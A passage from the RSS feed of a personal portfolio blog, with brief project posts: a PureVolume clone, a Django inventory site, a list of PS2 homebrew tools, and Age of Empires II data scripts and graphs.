</content:encoded></item><item><title>PureVolume clone profile.</title><link>https://alan.com.ar/posts/sujetopurevolume/</link><guid isPermaLink="true">https://alan.com.ar/posts/sujetopurevolume/</guid><pubDate>Mon, 02 Oct 2023 04:12:32 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/sujeto-purevolume/&quot;&gt;GitHub repository&lt;/a&gt; and the &lt;a href=&quot;https://purevolume.alan.com.ar/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/PureVolume&quot;&gt;PureVolume&lt;/a&gt; was a website for the discovery and promotion of new music and emerging artists. The mission was to give artists a new promotion tool. The site shut down on June 30, 2018. Luckily it was archived by &lt;a href=&quot;https://archive.org/web/&quot;&gt;Wayback Machine&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This is a profile page of a band. For the music player is used &lt;a href=&quot;https://github.com/abdes-zakari/HtmlAudioPlayer&quot;&gt;this one&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/Abdessamad_Zak&quot;&gt;Zakari Abdessamad&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/sujetopurevolume/purevolume.jpg&quot; alt=&quot;screenshot&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>This site.</title><link>https://alan.com.ar/posts/thissite/</link><guid isPermaLink="true">https://alan.com.ar/posts/thissite/</guid><pubDate>Sun, 01 Oct 2023 04:12:32 GMT</pubDate><content:encoded>&lt;p&gt;A blog-like site to upload projects and stuff I&apos;ve been working on. Made with &lt;a href=&quot;https://gohugo.io/&quot;&gt;Hugo Framework&lt;/a&gt;, using &lt;a href=&quot;https://github.com/dillonzq/LoveIt&quot;&gt;Loveit&lt;/a&gt; theme and some personal tweaks and changes.&lt;/p&gt;
</content:encoded></item><item><title>Inventory Management Website.</title><link>https://alan.com.ar/posts/inventorymanager/</link><guid isPermaLink="true">https://alan.com.ar/posts/inventorymanager/</guid><pubDate>Thu, 22 Jun 2023 04:12:32 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/Gestion-de-inventario-Django/&quot;&gt;GitHub repository&lt;/a&gt; and the &lt;a href=&quot;https://palomar57.pythonanywhere.com/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This project was developed for the &quot;Codo a Codo - Django&quot; course together with &lt;a href=&quot;https://github.com/omar-sca/&quot;&gt;Omar Scarazzato&lt;/a&gt;. It was made with Django Framework and PostgreSQL.&lt;/p&gt;
&lt;p&gt;The website allows the stock management of a warehouse. There are 3 levels of users:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Employee (Level 1, mostly read permissions).&lt;/li&gt;
&lt;li&gt;Supervisor (Level 2, read and write permissions).&lt;/li&gt;
&lt;li&gt;Administrator (Level 3, read and write permissions and access to Django&apos;s admin panel).&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Functionalities:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;View products: the products that are registered in the system will be listed in a table with their corresponding name, manufacturer and stock.
&lt;ul&gt;
&lt;li&gt;Depending on the type of user, the last column will show a button to edit and delete the product.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Register product: will allow you to register new products in the system.&lt;/li&gt;
&lt;li&gt;Edit product.&lt;/li&gt;
&lt;li&gt;Delete product.&lt;/li&gt;
&lt;li&gt;View manufacturers: the manufacturers that are registered in the system will be listed in a table with their corresponding name, address, telephone number and email address.
&lt;ul&gt;
&lt;li&gt;Depending on the type of user, the last column will show a button to edit and delete the manufacturer.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Register manufacturer.&lt;/li&gt;
&lt;li&gt;Edit manufacturer.&lt;/li&gt;
&lt;li&gt;Remove manufacturer: will allow you to remove manufacturers from the system. When deleting a manufacturer, the products associated to it will be deleted.&lt;/li&gt;
&lt;li&gt;Enter and exit items: it will modify the stock of the products. An invoice will be associated to each stock modification.&lt;/li&gt;
&lt;li&gt;View invoices: the invoices will be listed and will allow access to their details.&lt;/li&gt;
&lt;li&gt;View users.&lt;/li&gt;
&lt;li&gt;Add user.&lt;/li&gt;
&lt;li&gt;Edit user.&lt;/li&gt;
&lt;li&gt;Delete user.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Screenshots&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Login Page:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/inventorymanager/sitelogin.jpg&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Stock Page:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/inventorymanager/sitemain.jpg&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Entity-relationship diagram:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/inventorymanager/DER.jpg&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>PS2 Tools</title><link>https://alan.com.ar/posts/ps2tools/</link><guid isPermaLink="true">https://alan.com.ar/posts/ps2tools/</guid><pubDate>Wed, 22 Jun 2022 04:12:32 GMT</pubDate><content:encoded>&lt;h3&gt;Requirements:&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Memory Card with FreeMcBoot installed.&lt;/li&gt;
&lt;li&gt;Usb drive.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Tools:&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;PS2 Retroarch&lt;/strong&gt;
Emulators for Sega, Gameboy, Famicom, etc.
Just copy and paste to usb drive.&lt;/p&gt;
&lt;p&gt;http://buildbot.libretro.com/nightly/playstation/ps2/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;OPL Manager&lt;/strong&gt;
Manage roms (PS1 and PS2), add art covers.
Then copy and paste to usb drive.&lt;/p&gt;
&lt;p&gt;https://oplmanager.com/site/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;PSXVCD&lt;/strong&gt;
This application will help with converting PS1 games images (.zip, .7z, .rar, .ecm, .bin, .cue) into VCD to use it with POPStarter.&lt;/p&gt;
&lt;p&gt;https://www.psx-place.com/threads/psxvcd-by-englishl1989.19063/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;POPStarter&lt;/strong&gt;
POPStarter is a launcher which lets you play your PS1 games in combination with Sonys PS1 emulator for PS2 (known as POPS or SLBB-00001).&lt;/p&gt;
&lt;p&gt;https://www.psx-place.com/threads/popstarter.19139/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;USBUtil&lt;/strong&gt;
Useful for moving large PS2 game files to usb FAT32 drives.&lt;/p&gt;
&lt;p&gt;https://www.psx-place.com/threads/usbutil-by-iseko.19048/&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded></item><item><title>Age Of Carpincho Website.</title><link>https://alan.com.ar/posts/ageofcarpincho/</link><guid isPermaLink="true">https://alan.com.ar/posts/ageofcarpincho/</guid><pubDate>Wed, 16 Feb 2022 03:56:54 GMT</pubDate><content:encoded>&lt;p&gt;::github{repo=&quot;athekat/ageofcarpincho-angular&quot;}&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/ageofcarpincho-angular/&quot;&gt;GitHub repository&lt;/a&gt; and the &lt;a href=&quot;https://ageofcarpincho.alan.com.ar/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A site made with Angular framework that shows Plotly graphs of Age Of Empires II data.&lt;/p&gt;
&lt;p&gt;The project was originally just a static web page which can be viewed &lt;a href=&quot;https://athekat.github.io/AgeOfCarpincho/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://github.com/athekat/AgeOfCarpincho/&quot;&gt;this&lt;/a&gt; is the GitHub repository for that site. After learning a bit of Angular in a course I decided to take the site to the next level.&lt;/p&gt;
&lt;p&gt;Site:&lt;br /&gt;
&lt;img src=&quot;images/ageofcarpincho/output.jpg&quot; alt=&quot;Output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Binance P2P Prices (Python Script).</title><link>https://alan.com.ar/posts/binancep2p/</link><guid isPermaLink="true">https://alan.com.ar/posts/binancep2p/</guid><pubDate>Wed, 08 Dec 2021 02:03:29 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/Binance_P2P_Arb&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;One of my first Python scripts. It uses the Binance API to retrieve price information for BTC, ETH and USDT in both Spot and P2P markets.&lt;/p&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/binancep2p/output.jpg&quot; alt=&quot;output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Age of Empires II - Most used civilizations (R Script).</title><link>https://alan.com.ar/posts/aoemostusedciv/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoemostusedciv/</guid><pubDate>Fri, 20 Aug 2021 03:45:06 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/aoc-mostusedciv/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;R script to get the last 10 matches (using &lt;a href=&quot;https://aoe2.net&quot;&gt;aoe2.net&lt;/a&gt; API) and output a Plotly pie chart of the civs used.&lt;/p&gt;
</content:encoded></item><item><title>Age of Empires II - Compare players&apos; ratings (R Script).</title><link>https://alan.com.ar/posts/aoeeloplot/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoeeloplot/</guid><pubDate>Mon, 19 Jul 2021 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/AoE2-CompareUserRatings/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;R script that outputs a Plotly graph comparing player&apos;s elo rating across time, using &lt;a href=&quot;https://aoe2.net&quot;&gt;aoe2.net&lt;/a&gt; API.&lt;/p&gt;
&lt;p&gt;INPUT:&lt;br /&gt;
&lt;img src=&quot;images/aoeelorating/input.jpg&quot; alt=&quot;Input&quot; /&gt;&lt;/p&gt;
&lt;p&gt;OUTPUT:&lt;br /&gt;
&lt;img src=&quot;images/aoeelorating/output.jpg&quot; alt=&quot;Output&quot; /&gt;&lt;/p&gt;
</content:encoded></item></channel></rss>